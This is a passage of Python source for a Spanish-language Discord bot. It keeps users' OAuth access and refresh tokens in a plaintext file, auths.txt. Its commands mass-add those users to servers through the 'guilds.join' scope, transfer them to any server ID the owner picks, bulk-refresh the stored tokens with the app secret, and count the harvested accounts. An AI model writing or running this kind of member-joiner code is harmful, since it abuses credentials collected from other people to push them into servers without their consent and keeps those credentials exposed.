                f"Progreso: {barra_progreso(agregados, cantidad_real)}\n"
                f"Intentos: `{intentos}` | ✅ Añadidos: `{agregados}` | ❌ Fallidos: `{fallidos}`\n"
                f"**Últimos:** {ultimos_str}"
            )
            embed_prog.timestamp = datetime.datetime.now()
            await msg.edit(embed=embed_prog)
            await asyncio.sleep(0.3)

    elapsed    = int(time.time() - inicio)
    mins, secs = divmod(elapsed, 60)

    embed_fin = discord.Embed(
        title="✅ Operación completada",
        color=discord.Color.green(),
        timestamp=datetime.datetime.now()
    )
    embed_fin.add_field(name="🏠 Servidor",    value=f"`{ctx.guild.name}`",    inline=True)
    embed_fin.add_field(name="✅ Añadidos",    value=f"`{agregados}`",         inline=True)
    embed_fin.add_field(name="❌ Fallidos",    value=f"`{fallidos}`",          inline=True)
    embed_fin.add_field(name="🔄 Intentos",    value=f"`{intentos}`",          inline=True)
    embed_fin.add_field(name="⏱️ Tiempo",      value=f"`{mins}m {secs}s`",     inline=True)
    embed_fin.add_field(name="📊 Disponibles", value=f"`{total_disponible}`",  inline=True)
    if ultimos:
        embed_fin.add_field(
            name="👥 Últimos usuarios añadidos",
            value=', '.join(ultimos[-10:]),
            inline=False
        )
    embed_fin.set_footer(text=pie_embed(),
                         icon_url=bot.user.avatar.url if bot.user.avatar else None)
    await ctx.send(embed=embed_fin)

    gid = str(ctx.guild.id)
    if gid in guild_webhooks:
        embed_notif = discord.Embed(
            title="🚀 Miembros añadidos",
            description=(
                f"Se añadieron `{agregados}` usuarios a **{ctx.guild.name}**.\n"
                f"Fallidos: `{fallidos}` | Tiempo: `{mins}m {secs}s`"
            ),
            color=discord.Color.green(),
            timestamp=datetime.datetime.now()
        )
        embed_notif.set_footer(text=pie_embed())
        try:
            requests.post(guild_webhooks[gid], json={'embeds': [embed_notif.to_dict()]})
        except:
            pass


# ── !transferir (solo owner) ──────────────────────────────────────────────────
@bot.command(name='transferir')
@esta_autenticado()
@es_owner()
async def transferir(ctx, guild_id: int, cantidad: int):
    guild_destino = bot.get_guild(guild_id)
    if not guild_destino:
        await ctx.send(embed=embed_error(
            f"❌ No encontré el servidor con ID `{guild_id}`.\n"
            "Asegúrate de que el bot esté en ese servidor."
        ))
        return

    if not os.path.exists('auths.txt'):
        await ctx.send(embed=embed_error("⚠️ La base de datos está vacía."))
        return

    with open('auths.txt', 'r') as f:
        lineas = f.readlines()

    usuarios = {}
    for linea in lineas:
        try:
            uid, at, rt = linea.strip().split(',')
            usuarios[uid] = (at, rt)
        except:
            continue

    cantidad_real = min(cantidad, len(usuarios))
    lista = list(usuarios.items())
    random.shuffle(lista)

    agregados = 0
    fallidos  = 0
    intentos  = 0

    embed_prog = discord.Embed(
        title=f"🔀 Transfiriendo {cantidad_real} → {guild_destino.name}",
        description=f"Progreso: {barra_progreso(0, cantidad_real)}",
        color=discord.Color.orange(),
        timestamp=datetime.datetime.now()
    )
    embed_prog.set_footer(text=pie_embed())
    msg = await ctx.send(embed=embed_prog)

    while agregados < cantidad_real and lista:
        intentos += 1
        uid, (at, rt) = lista.pop()
        if agregar_miembro(guild_id, uid, at):
            agregados += 1
        else:
            fallidos += 1

        if intentos % 5 == 0 or agregados == cantidad_real or not lista:
            embed_prog.description = (
                f"Progreso: {barra_progreso(agregados, cantidad_real)}\n"
                f"✅ `{agregados}` | ❌ `{fallidos}`"
            )
            embed_prog.timestamp = datetime.datetime.now()
            await msg.edit(embed=embed_prog)
            await asyncio.sleep(0.3)

    elapsed    = int(time.time() - ctx.message.created_at.timestamp())
    mins, secs = divmod(abs(elapsed), 60)

    embed_fin = discord.Embed(
        title="✅ Transferencia completada",
        color=discord.Color.green(),
        timestamp=datetime.datetime.now()
    )
    embed_fin.add_field(name="🏠 Destino",  value=f"`{guild_destino.name}`", inline=True)
    embed_fin.add_field(name="✅ Añadidos", value=f"`{agregados}`",          inline=True)
    embed_fin.add_field(name="❌ Fallidos", value=f"`{fallidos}`",           inline=True)
    embed_fin.set_footer(text=pie_embed())
    await ctx.send(embed=embed_fin)


# ── !contar (solo owner) ──────────────────────────────────────────────────────
@bot.command(name='contar')
@esta_autenticado()
@es_owner()
async def contar(ctx):
    total = contar_auths()
    embed = discord.Embed(
        title="🔢 Base de datos de auths",
        description=f"**Usuarios únicos autenticados:** `{total}`",
        color=discord.Color.green(),
        timestamp=datetime.datetime.now()
    )
    embed.set_footer(text=pie_embed(),
                     icon_url=bot.user.avatar.url if bot.user.avatar else None)
    await ctx.send(embed=embed)


# ── !refrescar (solo owner) ───────────────────────────────────────────────────
@bot.command(name='refrescar')
@esta_autenticado()
@es_owner()
async def refrescar(ctx):
    inicio = time.time()

    if not os.path.exists('auths.txt'):
        await ctx.send(embed=embed_error("⚠️ La base de datos está vacía."))
        return

    with open('auths.txt', 'r') as f:
        lineas = f.readlines()

    tokens_unicos = {}
    for linea in lineas:
        try:
            uid, at, rt = linea.strip().split(',')
            tokens_unicos[uid] = (at, rt)
        except:
            continue

    total         = len(tokens_unicos)
    procesado     = 0
    refrescados   = []
    fallidos      = []
    nuevas_lineas = []

    embed_prog = discord.Embed(
        title="🔄 Refrescando tokens...",
        description=f"Progreso: {barra_progreso(0, total)}\nProcesados: `0/{total}`",
        color=discord.Color.blue(),
        timestamp=datetime.datetime.now()
    )
    embed_prog.set_footer(text=pie_embed(),
                          icon_url=bot.user.avatar.url if bot.user.avatar else None)
    msg = await ctx.send(embed=embed_prog)

    for uid, (at, rt) in tokens_unicos.items():
        try:
            datos = {
                'client_id':     app_id,
                'client_secret': secret,
                'grant_type':    'refresh_token',
                'refresh_token': rt,
                'redirect_uri':  redirect,
                'scope':         'identify guilds.join'
            }
            r = requests.post(f'{api}/oauth2/token', data=datos)
            if r.status_code == 200:
                nuevo    = r.json()
                nuevo_at = nuevo['access_token']
                nuevo_rt = nuevo['refresh_token']
                nuevas_lineas.append(f'{uid},{nuevo_at},{nuevo_rt}\n')
                refrescados.append(uid)
            else:
                nuevas_lineas.append(f'{uid},{at},{rt}\n')
                fallidos.append(uid)
        except Exception as e:
            print(f"[Error refrescando {uid}] {e}")
            nuevas_lineas.append(f'{uid},{at},{rt}\n')
            fallidos.append(uid)

        procesado += 1
        if procesado % 5 == 0 or procesado == total:
            embed_prog.description = (
                f"Progreso: {barra_progreso(procesado, total)}\n"
                f"Procesados: `{procesado}/{total}` | ✅ `{len(refrescados)}` | ❌ `{len(fallidos)}`"
            )
            embed_prog.timestamp = datetime.datetime.now()
            await msg.edit(embed=embed_prog)
            await asyncio.sleep(0.1)

    with open('auths.txt', 'w') as f:
        f.writelines(nuevas_lineas)

    elapsed    = int(time.time() - inicio)
    mins, secs = divmod(elapsed, 60)

    embed_fin = discord.Embed(
        title="✅ Refresco completado",
        color=discord.Color.green(),
        timestamp=datetime.datetime.now()
    )
    embed_fin.add_field(name="✅ Refrescados", value=f"`{len(refrescados)}`", inline=True)
    embed_fin.add_field(name="❌ Fallidos",    value=f"`{len(fallidos)}`",    inline=True)
    embed_fin.add_field(name="📊 Total",       value=f"`{total}`",            inline=True)
    embed_fin.add_field(name="⏱️ Tiempo",      value=f"`{mins}m {secs}s`",    inline=True)
    embed_fin.set_footer(text=pie_embed(),
                         icon_url=bot.user.avatar.url if bot.user.avatar else None)
    await ctx.send(embed=embed_fin)


# ── !estado ───────────────────────────────────────────────────────────────────
@bot.command(name='estado')
@esta_autenticado()
async def estado(ctx):
    latencia       = round(bot.latency * 1000)
    total_auths    = contar_auths()
    total_guilds   = len(bot.guilds)
    total_webhooks = len(guild_webhooks)

    embed = discord.Embed(
        title=f"📊 Estado de {BOT_NAME}",
        color=discord.Color.blurple(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="🏓 Latencia",        value=f"`{latencia} ms`",    inline=True)
    embed.add_field(name="💾 Auths en BD",      value=f"`{total_auths}`",    inline=True)
    embed.add_field(name="🖥️ Servidores",       value=f"`{total_guilds}`",   inline=True)
    embed.add_field(name="🔗 Webhooks activos", value=f"`{total_webhooks}`", inline=True)
    embed.add_field(name="🤖 Bot",              value=f"`{bot.user}`",       inline=True)
    embed.add_field(name="⚡ Prefijo",          value=f"`{PREFIJO}`",        inline=True)
    embed.set_footer(text=pie_embed(),
                     icon_url=bot.user.avatar.url if bot.user.avatar else None)
    await ctx.send(embed=embed)


# ══════════════════════════════════════════════════════════════════════════════
#  ERROR HANDLER GLOBAL
# ══════════════════════════════════════════════════════════════════════════════
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(embed=discord.Embed(
            title="⚠️ Argumento faltante",
            description=f"Faltan argumentos. Usa `{PREFIJO}ayuda` para ver el uso correcto.",
            color=discord.Color.orange()
        ), delete_after=8)
    elif isinstance(error, commands.BadArgument):
        await ctx.send(embed=embed_error(
            f"❌ Argumento incorrecto. Comprueba el tipo de dato.\n"
            f"Usa `{PREFIJO}ayuda` para ver ejemplos."
        ), delete_after=8)
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send(embed=embed_error(
            "❌ No tienes permisos suficientes para este comando."
        ), delete_after=8)
    elif isinstance(error, commands.CommandNotFound):
        pass
    elif isinstance(error, commands.CheckFailure):
        pass
    else:
        print(f"[Error no manejado] {error}")
        await ctx.send(embed=embed_error(f"❌ Error inesperado: `{str(error)}`"), delete_after=10)


# ══════════════════════════════════════════════════════════════════════════════
#  ARRANQUE
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    mantener_vivo()
    bot.run(token, reconnect=True)
